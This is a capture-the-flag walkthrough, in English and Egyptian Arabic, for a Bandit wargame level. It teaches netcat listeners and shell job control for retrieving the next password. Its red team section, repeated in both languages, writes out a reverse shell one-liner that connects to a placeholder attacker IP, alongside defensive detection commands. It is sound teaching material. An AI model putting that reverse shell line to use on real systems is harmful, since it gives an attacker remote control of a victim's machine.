### 🏴‍☠️ [Level 20 → Level 21]

**1. 🎯 The Objective & The "Why"**
- **The Question:** There is a setuid binary in the home directory that connects to `localhost` on a port you specify as a command-line argument, reads a line of text from that connection, and compares it against the current password (bandit20). If it matches, it transmits the password for bandit21.
- **The Goal:** You need to set up your OWN listening service on some port, feed it your current password when the setuid binary connects to it, and receive the next password back. This means YOU have to become both the client AND simultaneously run a server — all within one terminal session (or by cleverly juggling multiple sessions).
- **The Why:** This level is your introduction to **Unix job control and background processes** — the ability to run multiple tasks concurrently within a single shell session, switching between them, backgrounding them, and bringing them back to the foreground. This is a foundational skill for anyone doing real hands-on Linux work, especially in red team engagements where you might need to run a listener while simultaneously triggering the exploit that connects to it.

---

### 💻 The Execution (Step-by-Step)
You're logged in as `bandit20`. Let's see what we're given:

```bash
ls -la
```
You'll see a file, typically named `suconnect`, with that telltale `s` in its permission bits (SUID bit set, owned by `bandit21`, exactly like we learned last level). Let's run it bare to understand its usage:

```bash
./suconnect
```
It'll likely print something like:
```
Usage: ./suconnect <portnumber>
```
So it wants a port number as an argument. Based on the level description, here's what's ACTUALLY going to happen when we run it: this program will connect OUT to `localhost` on whatever port we specify, expecting to READ a line of text from whoever is listening on that port. If that text matches the bandit20 password exactly, it'll send BACK the bandit21 password through that same connection.

This means WE need to be the one LISTENING on that port, ready to send our current password the moment `suconnect` connects to us. This is a two-step dance that needs to happen in a specific order:

**Step 1: Start a listener on a port of your choice, BEFORE running suconnect.**

We use `nc` (netcat) in "listen mode":
```bash
nc -l -p 12345
```
- `-l`: Stands for "listen." Instead of `nc`'s usual behavior of CONNECTING out to a remote host, this flag flips it into SERVER mode — it opens up the specified port and waits for something ELSE to connect TO it.
- `-p 12345`: Specifies WHICH port to listen on. You can pick basically any unused port number above 1024 (ports below that typically require root privileges) — `12345` is just an arbitrary example.

Once you run this, your terminal will just sit there, silently waiting for an incoming connection. This is now occupying your CURRENT terminal session entirely — it's "in the foreground," meaning you can't type any other commands here until this process ends.

**Step 2: In a SEPARATE session, run suconnect pointing at that same port.**

Here's where "job control" becomes essential. You have a few options:

**Option A — Open a second SSH session entirely.** Just open a new terminal window/tab on your own computer and SSH into bandit20 again separately. Now you have TWO independent sessions: one running your `nc` listener, and one free to run `suconnect`.

**Option B — Background the netcat listener within the SAME session using job control.**
```bash
nc -l -p 12345 &
```
- The `&` at the end tells bash: "run this command in the BACKGROUND, and immediately give me my terminal prompt back so I can keep typing other commands." This is the core magic of job control — instead of your terminal being "stuck" waiting on `nc`, it runs quietly behind the scenes while you continue working in the SAME session.

You could also start `nc -l -p 12345` normally (in the foreground), then press `Ctrl+Z` to SUSPEND it (pause it without killing it), which frees up your prompt, and later use the `bg` command to resume it running in the background, or `fg` to bring it back to the foreground. Running `jobs` at any time shows you a list of everything you've backgrounded/suspended in your current session.

Now, whichever method you chose, with your listener actively running and waiting, execute the setuid binary pointing it at the SAME port:

```bash
./suconnect 12345
```

The moment you run this, `suconnect` connects to `localhost:12345` — which is exactly where your `nc` listener is waiting. Now, over in your `nc` window/session, TYPE your current bandit20 password and hit Enter:

```
[Password_Appears_Here]
```

That text gets sent through the connection to `suconnect`, which reads it, checks if it matches, and — if correct — sends the level 21 password BACK through that same connection, which will now appear in your `nc` window/terminal.

---

### 🌍 Real-World & Tactical Application
Running listeners while simultaneously triggering connections is a routine daily task in red teaming.

- **🔴 Red Team Perspective:** This exact workflow (start a listener, THEN trigger a connection back to it) is the literal backbone of reverse shell exploitation. An attacker sets up a `nc -lvp 4444` listener on their own machine, then tricks a target into executing a payload that connects BACK to that listener (`bash -i >& /dev/tcp/attacker_ip/4444 0>&1`), giving them an interactive shell. Job control (`&`, `Ctrl+Z`, `bg`, `fg`) is essential during real engagements when you need to juggle multiple listeners, multiple shells, and multiple tools simultaneously without opening dozens of separate terminal windows. Tools like `screen` and `tmux` take this even further, letting you maintain persistent, detachable terminal sessions — critical when you need a long-running listener to survive even if your SSH connection to your own attack box drops.
- **🔵 Blue Team Perspective:** Defenders monitor for unexpected LISTENING ports appearing on internal hosts (`netstat -tulnp` or `ss -tulnp` are the detection-side commands) since a machine suddenly opening a new listening port is a classic sign of a planted backdoor or reverse shell handler. Network-level monitoring also watches for unusual OUTBOUND connections to unfamiliar high-numbered ports, since that's exactly the pattern a reverse shell connection creates.

---

### 🚦 The Filter (Focus vs. Ignore)
- **FOCUS ON:** The `nc -l -p PORT` syntax for creating a listener, and the `&` symbol for backgrounding a process so your terminal stays usable. Also understand `Ctrl+Z` (suspend), `bg` (resume in background), `fg` (bring back to foreground), and `jobs` (list your background/suspended tasks) as your core job-control toolkit.
- **IGNORE:** Don't get distracted trying to learn `screen` or `tmux` in full depth right now (they're mentioned as alternatives) — a second SSH window or simple `&` backgrounding is more than enough to solve this specific level. Save deep `tmux` mastery for when you're managing dozens of simultaneous sessions in a real engagement.

---

### 🇪🇬   سيريوس (Sirius Notes - Egyptian Arabic)

>   اللفل ده هيعلمك إزاي تشغل أكتر من حاجة في نفس الوقت في التيرمينال، خليني اوريك.
>
> **1. 🎯 الهدف و "الليه"**
> - **السؤال:** فيه برنامج SUID في الـ home directory بيتصل بـ `localhost` على بورت انت بتحدده كـ argument، وبيقرا سطر نص من الاتصال ده، ويقارنه بباسورد اللفل الحالي (bandit20). لو الباسورد صح، هيبعت باسورد bandit21.
> - **الهدف:** لازم تظبط سيرفر خاص بيك واقف على بورت معين، وتديله باسوردك الحالي لما البرنامج SUID يتصل بيه، وتستقبل الباسورد الجاي رجوع. ده معناه انت لازم تبقى **الكلاينت والسيرفر في نفس الوقت**—كل ده جوه جلسة تيرمينال واحدة (أو عن طريق ادارة أكتر من جلسة بذكاء).
> - **الليه؟** اللفل ده مدخلك لـ **التحكم في المهام (Job Control) والعمليات الخلفية (background processes)** في اليونكس—القدرة إنك تشغل أكتر من مهمة مع بعض جوه جلسة شِل واحدة، وتنقل بينهم، وتبعت واحدة تشتغل في الخلفية، وترجعها للواجهة تاني. دي مهارة أساسية لأي حد شغال فعلياً في اللينكس، خصوصاً في عمليات Red Team لما تحتاج تشغل listener وفي نفس الوقت تشغل الاستغلال اللي هيتصل بيه.
>
> **2. 💻 التنفيذ خطوة بخطوة**
> انت عامل login كـ `bandit20`. يلا نشوف اديناك ايه:
>
> ```bash
> ls -la
> ```
> هتلاقي ملف، غالباً اسمه `suconnect`، وعليه `s` مميزة في صلاحياته (بت الـ SUID مفعّل، ومملوك لـ `bandit21`، بالظبط زي ما اتعلمنا اللفل اللي فات). يلا نشغله عاري عشان نفهم استخدامه:
>
> ```bash
> ./suconnect
> ```
> غالباً هيطبع حاجة زي:
> ```
> Usage: ./suconnect <portnumber>
> ```
> يبقى هو عايز رقم بورت كـ argument. بناءً على وصف اللفل، ده اللي **فعلياً** هيحصل لما نشغله: البرنامج ده هيتصل خارجي لـ `localhost` على أي بورت هنحدده، متوقع إنه **يقرا** سطر نص من أي حد واقف يستنى على البورت ده. لو النص ده مطابق لباسورد bandit20 بالظبط، هيبعت **رجوع** باسورد bandit21 عبر نفس الاتصال ده.
>
> ده معناه إحنا لازم نبقى احنا اللي **واقفين نستنى** على البورت ده، جاهزين نبعت باسوردنا الحالي في اللحظة اللي `suconnect` يتصل بينا فيها. دي رقصة من خطوتين لازم تحصل بترتيب معين:
>
> **الخطوة 1: شغل listener على بورت من اختيارك، قبل ما تشغل suconnect.**
>
> هنستخدم `nc` (نتكات) في "وضع الاستماع":
> ```bash
> nc -l -p 12345
> ```
> - `-l`: معناها "listen" (استمع). بدل السلوك المعتاد لـ `nc` بإنها تتصل **خارجي** لجهاز بعيد، الفلاج ده بيقلبها لوضع **السيرفر**—بتفتح البورت المحدد وتستنى حاجة **تانية** تتصل **بيها**.
> - `-p 12345`: بيحدد أنهي بورت نستمع عليه. تقدر تختار أي رقم بورت مش مستخدم فوق 1024 (البورتات تحت الرقم ده غالباً محتاجة صلاحيات root)—`12345` مجرد مثال عشوائي.
>
> بمجرد ما تشغل الأمر ده، التيرمينال بتاعك هيقعد يستنى بصمت اتصال داخل. ده دلوقتي بيشغل جلسة التيرمينال **الحالية** بتاعتك بالكامل—هو "في الواجهة الأمامية"، يعني مش هتقدر تكتب أي أمر تاني هنا لحد ما العملية دي تخلص.
>
> **الخطوة 2: في جلسة منفصلة، شغل suconnect وحدد نفس البورت.**
>
> هنا بالظبط بيبقى "التحكم في المهام" أساسي. عندك كذا خيار:
>
> **الخيار أ — افتح جلسة SSH ثانية بالكامل.** بس افتح نافذة/تاب تيرمينال جديدة على جهازك واعمل SSH لـ bandit20 تاني بشكل منفصل. دلوقتي عندك جلستين مستقلتين: واحدة شغالة عليها الـ listener بتاعك بـ `nc`، وواحدة فاضية تقدر تشغل فيها `suconnect`.
>
> **الخيار ب — خلي الـ netcat listener يشتغل في الخلفية جوه نفس الجلسة باستخدام job control.**
> ```bash
> nc -l -p 12345 &
> ```
> - الـ `&` في الآخر بتقول للباش: "شغل الأمر ده في **الخلفية**، وارجعلي البرومبت بتاعي فوراً عشان أقدر أكمل أكتب أوامر تانية." ده السحر الأساسي بتاع job control—بدل ما التيرمينال بتاعك يفضل "واقف" مستني على `nc`، هو بيشتغل بهدوء في الخلفية وانت مكمل شغلك في نفس الجلسة.
>
> تقدر كمان تشغل `nc -l -p 12345` عادي (في الواجهة الأمامية)، وبعدين تدوس `Ctrl+Z` عشان **توقفه مؤقتاً** (تعلقه من غير ما تقتله)، وده بيفضي البرومبت بتاعك، وبعدين تستخدم أمر `bg` عشان يكمل يشتغل في الخلفية، أو `fg` عشان ترجعه للواجهة الأمامية تاني. تشغيل `jobs` في أي وقت بيوريك قايمة بكل حاجة عملتلها background/suspend في جلستك الحالية.
>
> دلوقتي، أي طريقة اخترتها، مع الـ listener بتاعك شغال ومستني، شغل برنامج الـ SUID محدد فيه نفس البورت:
>
> ```bash
> ./suconnect 12345
> ```
>
> لحظة ما تشغل الأمر ده، `suconnect` هتتصل بـ `localhost:12345`—وده بالظبط المكان اللي الـ `nc` listener بتاعك مستني فيه. دلوقتي، في نافذة/جلسة الـ `nc` بتاعتك، **اكتب باسورد bandit20 الحالي بتاعك** ودوس Enter:
>
> ```
> [Password_Appears_Here]
> ```
>
> النص ده بيتبعت عبر الاتصال لـ `suconnect`، اللي بيقراه، يتأكد إنه مطابق، ولو صح—بيبعت باسورد اللفل 21 **رجوع** عبر نفس الاتصال، اللي هيظهر دلوقتي في نافذة/تيرمينال الـ `nc` بتاعك.
>
> **3. 🌍 التطبيق الواقعي والتكتيكي**
> تشغيل listeners مع تشغيل اتصالات في نفس الوقت مهمة يومية روتينية في الـ Red Teaming.
>
> - **🔴 من منظور الـ Red Team:** الـ workflow ده بالظبط (شغل listener، وبعدين شغّل اتصال يرجعله) هو حرفياً عمود استغلال الـ reverse shell. المهاجم بيظبط `nc -lvp 4444` listener على جهازه، وبعدين بيخدع الهدف إنه يشغل حمولة بترجعله على الـ listener ده (`bash -i >& /dev/tcp/attacker_ip/4444 0>&1`)، وده بيديه شِل تفاعلي. التحكم في المهام (`&` و `Ctrl+Z` و `bg` و `fg`) أساسي في العمليات الحقيقية لما تحتاج تدير أكتر من listener، وأكتر من شِل، وأكتر من أداة في نفس الوقت من غير ما تفتح عشرات النوافذ المنفصلة. أدوات زي `screen` و `tmux` بتاخد الفكرة دي لأبعد من كده، وبتخليك تحافظ على جلسات تيرمينال دائمة قابلة للفصل—مهم جداً لما تحتاج listener يفضل شغال حتى لو اتصال الـ SSH بتاعك بجهاز الهجوم نفسه اتقطع.
> - **🔵 من منظور الـ Blue Team:** المدافعين بيراقبوا ظهور بورتات استماع غير متوقعة على أجهزة داخلية (`netstat -tulnp` أو `ss -tulnp` هما أوامر الكشف من جهة الدفاع) لإن جهاز فجأة بيفتح بورت استماع جديد ده علامة كلاسيكية على باكدور مزروع أو معالج reverse shell. مراقبة الشبكة كمان بتراقب اتصالات خارجة غريبة لبورتات غير مألوفة عالية الرقم، لإن ده بالظبط النمط اللي اتصال reverse shell بيعمله.
>
> **4. 🚦 الفلتر (ركز/تجاهل)**
> - **ركز على:** صيغة `nc -l -p PORT` لعمل listener، ورمز `&` لتشغيل عملية في الخلفية عشان التيرمينال بتاعك يفضل مستخدم. وكمان افهم `Ctrl+Z` (تعليق)، و `bg` (استكمال في الخلفية)، و `fg` (رجوع للواجهة الأمامية)، و `jobs` (قايمة مهامك في الخلفية/المعلقة) كأدواتك الأساسية للتحكم في المهام.
> - **تجاهل:** متتشتتش وانت بتحاول تتعلم `screen` أو `tmux` بعمق دلوقتي (مذكورين كبدايل)—نافذة SSH ثانية أو `&` بسيطة كافيين جداً لحل اللفل ده بالتحديد. وفر إتقان `tmux` العميق للحظة اللي هتدير فيها عشرات الجلسات المتزامنة في عملية حقيقية.
